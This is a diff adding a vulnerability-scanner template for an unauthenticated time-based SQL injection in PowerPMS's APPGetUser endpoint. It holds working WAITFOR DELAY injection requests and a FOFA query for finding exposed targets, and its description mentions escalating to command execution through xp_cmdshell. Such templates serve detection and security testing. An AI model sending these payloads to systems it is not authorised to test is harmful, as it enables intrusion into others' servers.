@@ -1,0 +1,37 @@
+id: puhua-PowerPMS-APPGetUser-sql
+
+info:
+  name: "普华-PowerPMS APPGetUser 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="普华科技-PowerPMS"
+      普华-PowerPMS系统APPGetUser接口存在SQL注入漏洞。攻击者可利用该漏洞通过构造恶意SQL查询触发时间延迟注入行为，并结合数据库xp_cmdshell扩展存储过程执行任意系统命令，最终实现对目标服务器的完全控制。经技术分析表明，该漏洞攻击路径直接且无需身份认证，建议受影响系统立即部署防护措施。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486023&idx=1&sn=3bd1ffde9c30393b099ac8f7e86f6792&chksm=c267bf74f5103662ada86eec583a96273e6d358845a0f31a23ed3d98553dda5cabf78c837f01&token=2024266625&lang=zh_CN#rd
+  tags: 普华-PowerPMS
+
+
+http:
+- raw:
+  - |
+    GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
+    Host: {{Hostname}}
+
+  - |
+    GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
+    Host: {{Hostname}}
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
